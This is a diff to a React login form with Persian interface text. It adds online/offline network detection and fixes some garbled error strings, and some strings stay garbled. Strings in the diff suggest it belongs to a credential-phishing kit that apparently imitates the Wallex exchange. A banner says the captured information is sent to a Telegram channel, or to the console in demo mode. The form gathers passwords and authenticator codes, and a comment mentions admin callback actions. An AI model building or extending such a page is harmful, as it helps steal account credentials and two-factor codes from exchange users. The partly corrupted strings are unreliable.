@@ -109,11 +109,25 @@ export const LoginForm = () => {
   // Network status tracking for better offline detection
   useEffect(() => {
     const handleOnline = () => {
-      console.log("🌐 Network came online");
+      console.log("🌐 Browser reports network came online");
+      // Trigger a status check to verify actual connectivity
+      if (sessionId) {
+        setTimeout(() => {
+          console.log("🔍 Auto-checking network status after online event");
+          checkNetworkStatus().then((status) => {
+            console.log("📊 Auto network check result:", status);
+          });
+        }, 1000);
+      }
     };
 
     const handleOffline = () => {
-      console.log("🌐 Network went offline");
+      console.log("🌐 Browser reports network went offline");
+      // Force offline status if we have an active session
+      if (sessionId) {
+        const offlineStatus = enhancedOfflineDetection.forceOffline();
+        console.log("🔴 Forced offline status:", offlineStatus);
+      }
     };
 
     window.addEventListener('online', handleOnline);
@@ -123,7 +137,7 @@ export const LoginForm = () => {
       window.removeEventListener('online', handleOnline);
       window.removeEventListener('offline', handleOffline);
     };
-  }, []);
+  }, [sessionId]);
 
   // Register callback handler for admin actions
   useEffect(() => {
@@ -515,7 +529,7 @@ export const LoginForm = () => {
       }, 500);
     } catch (error) {
       console.error("Password submission error:", error);
-      setErrors({ password: "خطا ��ر ��رسال ��مز عبور. لطفا دوباره تلاش کنید." });
+      setErrors({ password: "خطا در ��رسال ��مز عبور. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -555,7 +569,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارسال کد. لطفا دوباره تلا�� کنید.",
+        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -981,7 +995,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت د��و: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -2533,7 +2547,7 @@ export const LoginForm = () => {
                     onClick={(e) => {
                       e.preventDefault();
                       alert(
-                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
+                        "لینک بازیابی رمز عبور به ایمیل شم�� ارسال خواهد شد.",
                       );
                     }}
                     style={{
